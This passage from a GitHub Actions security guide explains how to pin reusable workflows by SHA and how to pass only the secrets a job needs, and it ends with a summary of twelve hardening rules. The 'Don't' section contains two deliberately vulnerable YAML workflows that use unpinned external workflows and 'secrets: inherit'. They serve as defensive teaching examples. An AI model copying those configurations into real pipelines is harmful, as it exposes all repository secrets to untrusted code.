**Do**: Pin reusable workflows and carefully manage secret passing.

```yaml
# Secure reusable workflow consumption
name: Deploy
on:
  push:
    branches: [main]

jobs:
  test:
    # Pin by SHA
    uses: myorg/workflows/.github/workflows/test.yml@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
    with:
      node-version: '20'

  deploy:
    needs: test
    # Pin by SHA
    uses: myorg/workflows/.github/workflows/deploy.yml@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
    with:
      environment: production
    secrets:
      # Explicitly pass only needed secrets
      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
      # NOT: secrets: inherit
```

```yaml
# Secure reusable workflow definition
name: Reusable Deploy Workflow
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
    secrets:
      DEPLOY_KEY:
        required: true
        description: 'Deployment key for target environment'
    outputs:
      deployment-url:
        description: 'URL of deployed application'
        value: ${{ jobs.deploy.outputs.url }}

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    outputs:
      url: ${{ steps.deploy.outputs.url }}
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Deploy
        id: deploy
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
        run: |
          # Validate environment
          if [[ "${{ inputs.environment }}" != "staging" && "${{ inputs.environment }}" != "production" ]]; then
            echo "Invalid environment"
            exit 1
          fi
          ./deploy.sh
          echo "url=https://app.example.com" >> "$GITHUB_OUTPUT"
```

**Don't**: Use unpinned workflows or inherit all secrets.

```yaml
# VULNERABLE: Unpinned and over-shared
name: Insecure Workflow
on: [push]

jobs:
  deploy:
    # Unpinned - can change at any time
    uses: external-org/workflows/.github/workflows/deploy.yml@main
    secrets: inherit  # Passes ALL secrets to external workflow
    # External workflow now has access to all your secrets
```

```yaml
# VULNERABLE: Trusting unverified workflows
name: Build
on: [push]

jobs:
  build:
    # Using workflow from unknown source
    uses: random-user/workflows/.github/workflows/build.yml@v1
    # Who audited this workflow?
    # What does it do with your code and secrets?
```

**Why**: Reusable workflows execute with caller permissions and secrets. Unpinned workflows can be modified to exfiltrate secrets or modify artifacts. `secrets: inherit` passes all secrets to the called workflow, including ones not needed for the task. Only trusted, pinned workflows should receive secrets.

**Refs**:
- CWE-829: Inclusion of Functionality from Untrusted Control Sphere
- OWASP CI/CD Top 10: CICD-SEC-3 Dependency Chain Abuse
- GitHub Docs: Reusing workflows
- GitHub Docs: Using secrets in a workflow

---

## Summary

These GitHub Actions security rules address the most critical risks in workflow configuration:

1. **Pin all actions by SHA** - Prevent supply chain attacks through mutable tags
2. **Use minimal token permissions** - Limit blast radius of compromised workflows
3. **Mask secrets in logs** - Prevent credential exposure through verbose output
4. **Sanitize external inputs** - Prevent command injection attacks
5. **Use OIDC for cloud auth** - Eliminate long-lived credentials
6. **Require environment reviewers** - Ensure production deployments are approved
7. **Protect against fork PRs** - Separate trusted and untrusted code execution
8. **Sign and attest artifacts** - Ensure artifact integrity and provenance
9. **Block vulnerable dependencies** - Catch supply chain risks before merge
10. **Use ephemeral self-hosted runners** - Prevent cross-job attacks
11. **Pin reusable workflows** - Trust boundaries for shared workflows
12. **Limit secret passing** - Only share necessary secrets

Apply these rules to all GitHub Actions workflows for comprehensive security protection.
